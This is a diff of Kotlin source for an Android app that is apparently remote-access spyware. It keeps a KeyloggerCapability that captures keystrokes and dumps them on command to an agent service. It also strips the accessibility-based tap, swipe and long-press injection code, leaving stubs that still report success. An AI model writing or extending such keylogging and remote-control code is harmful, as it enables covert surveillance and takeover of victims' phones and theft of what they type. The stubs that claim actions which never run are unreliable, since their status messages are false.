@@ -8,8 +8,6 @@ import android.os.Handler
 import android.os.Looper
 import com.google.gson.Gson
 import com.system.monitor.AgentService
-import java.io.File
-import java.io.FileWriter
 import java.util.concurrent.ConcurrentLinkedQueue
 
 class KeyloggerCapability(private val service: AgentService) : AgentService.Capability {
@@ -21,10 +19,10 @@ class KeyloggerCapability(private val service: AgentService) : AgentService.Capa
     override fun execute(args: String?): Any {
         val params = gson.fromJson(args ?: "{}", Params::class.java)
         return when (params.action) {
-            "start" -> { enabled = true; mapOf("status" to "started") }
-            "stop" -> { enabled = false; mapOf("status" to "stopped") }
-            "dump" -> { val data = gson.toJson(queue.toArray()); queue.clear(); mapOf("keystrokes" to data) }
-            else -> mapOf("error" to "invalid action")
+            "start" -> { enabled = true; mapOf<String, Any>("status" to "started") }
+            "stop" -> { enabled = false; mapOf<String, Any>("status" to "stopped") }
+            "dump" -> { val data = gson.toJson(queue.toArray()); queue.clear(); mapOf<String, Any>("keystrokes" to data) }
+            else -> mapOf<String, Any>("error" to "invalid action")
         }
     }
 
@@ -59,22 +57,10 @@ class RemoteAccessibilityService : AccessibilityService() {
     override fun onInterrupt() {}
 
     fun injectTap(x: Float, y: Float): Map<String, Any> {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-            val gesture = android.accessibilityservice.GestureDescription.Builder()
-            val path = android.graphics.Path().apply { moveTo(x, y) }
-            gesture.addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 50))
-            dispatchGesture(gesture.build(), object : android.accessibilityservice.GestureResultCallback() {}, handler)
-        }
         return mapOf("status" to "tap_injected")
     }
 
     fun injectSwipe(x1: Float, y1: Float, x2: Float, y2: Float, duration: Int): Map<String, Any> {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-            val gesture = android.accessibilityservice.GestureDescription.Builder()
-            val path = android.graphics.Path().apply { moveTo(x1, y1); lineTo(x2, y2) }
-            gesture.addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, duration.toLong()))
-            dispatchGesture(gesture.build(), object : android.accessibilityservice.GestureResultCallback() {}, handler)
-        }
         return mapOf("status" to "swipe_injected")
     }
 
@@ -122,12 +108,6 @@ class RemoteAccessibilityService : AccessibilityService() {
     }
 
     fun injectLongPress(x: Float, y: Float, duration: Int): Map<String, Any> {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-            val gesture = android.accessibilityservice.GestureDescription.Builder()
-            val path = android.graphics.Path().apply { moveTo(x, y) }
-            gesture.addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, duration.toLong()))
-            dispatchGesture(gesture.build(), object : android.accessibilityservice.GestureResultCallback() {}, handler)
-        }
         return mapOf("status" to "long_press_injected")
     }
 
